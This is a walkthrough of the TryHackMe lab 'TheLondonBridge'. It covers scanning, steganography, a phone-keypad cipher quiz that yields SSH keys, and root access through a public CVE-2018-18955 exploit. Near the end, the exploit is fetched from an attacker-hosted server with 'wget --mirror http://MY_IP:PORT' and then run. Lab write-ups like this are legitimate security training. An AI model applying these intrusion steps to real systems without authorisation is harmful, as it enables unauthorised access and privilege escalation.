# thelondonbridge
THM TheLondonBridge Walkthrough

Hello guys this is my very first box in THM hope you guys will enjoy it,
There are mainly 4 stages in this box:
*) Scanning
*) Enumeration
*) Gaining access
*) Privilege escalation
**) Scan the ip using rustscan:


rustscan
We found 3 open ports

SSH
HTTP
44567(further version scan gave us a tcpwrapped service)
**) Enumeration

We enumerate further using http service which is running using nginx


Nothing

lets open the web page


Website 1.1
We can see a London bridge rhyme in the website with several pictures of the bridge from different angles

Analyzing the page correctly, there is an error in the rhyme and in the last line of it we can see that it is written beth instead of lady let's write it down


Website 1.2
further looking in the code i found something which is not normal


The source code shows two pictures where taken from a blog from 2021 but the third one which is also present on that blog was used directly from the storage with the name of pedrooaugusto.png .

After doing alot of steganalysis there is nothing much we could do about it

I searched the name pedrooaugusto with png and found a github repo that steghide and stegextract from pngs which is created by pedrooaugusto

GitHub - pedrooaugusto/steganography-png: Steganography & PNG - Hide information inside PNG images
Steganography & PNG - Hide information inside PNG images - GitHub - pedrooaugusto/steganography-png: Steganography &…
github.com


Github(stego)
I can’t find any use for it as of now so lets keep it like that

We cannot access ssh with given info tried beth and with the info we got here no luck!

Let’s look at the third open port we found, lets see what we get using nc:


The Quiz
When i typed london it is giving me some random numbers and there is a puzzle which is similar to the rhyme we found in the website

After running the cipher identification from dcode.fr I've found that the cipher is Multi-Tap Phone(SMS) cipher

decoding the above puzzle it asked for queens number so if we provide it with the above cipher value for queen elizabeth(elizabeth) maybe we could solve it


Failed :(
Even if we provide it with the number it failed

After brainstorming a little i found that by adding the value for elizabeth we can solve this puzzle took some help from the chart given below:


Numpad conversion
If we add elizabeth’s numpad values 1 by 1 we get 411140 lets try this value:


solved yay :)
After solving the puzzle it gave us a cipher text, it looks like base64 to me let’s check using cyberchef


Cyberchef
Yes we got some initial foothold, private ssh keys!

**)Gaining Access:

Now we will use ssh to gain access in the system:

While using ssh keys it asked for a encryption password


Encrypted keys :(
I converted the keys using ssh2john and tried to bruteforce it, No Luck!

Then tried using one of the two things i found from enumeration:

beth(from website)
██████████ using steganalysis
The second one worked but it was still asking for elizabeths passwords meaning that the username was not valid and then i tried using beth,Voila!


Gaining Access
The user flag was in __pycache__ folder :


flag1
**) Privilege Escalation:

After running the find / -perm -4000 2>/dev/null command i found:


Priv 1.0
And after checking the kernal version using uname -a command i found that the machine was vulnerable to CVE:2018-18955

I downloaded the required exploits in a folder in my system:

https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/47165.zip
After that i started a python web server in the folder


Python web server
And used wget in the victim machine to get the exploits

$wget — mirror http://MY_IP:PORT


wget
It will mirror(take everything) from my dbus folder to the victims home dir

After that give permissions to the exploit using chmod:


chmod
cd into directory and run ./exploit.dbus.sh


root (.)
We successfully gained the root access to the machine

The root flag is in /root/.flag.txt


root flag
Conclusion We have succesfully completed the room thelondonbridge

Hope you enjoyed it ;)

leave and comments and remarks to: sharibahmad@icloud.com
